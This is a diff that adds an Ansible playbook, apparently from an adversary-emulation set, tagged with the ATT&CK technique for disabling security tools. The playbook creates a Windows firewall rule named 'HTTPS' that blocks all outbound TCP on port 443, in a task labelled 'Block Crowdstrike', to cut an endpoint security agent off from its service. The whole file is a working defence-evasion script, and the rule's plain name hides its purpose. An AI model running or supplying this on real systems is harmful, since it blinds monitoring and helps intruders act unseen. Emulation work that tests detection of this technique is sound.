@@ -1,1 +1,16 @@
 #T1089 Block traffic
+- name: Disabling Security Tools - Windows - Block Traffic
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: Block Crowdstrike
+      win_firewall_rule:
+        name: HTTPS
+        localport: any
+        remoteport: 443
+        action: block
+        direction: out
+        protocol: tcp
+        state: present
+        enabled: yes
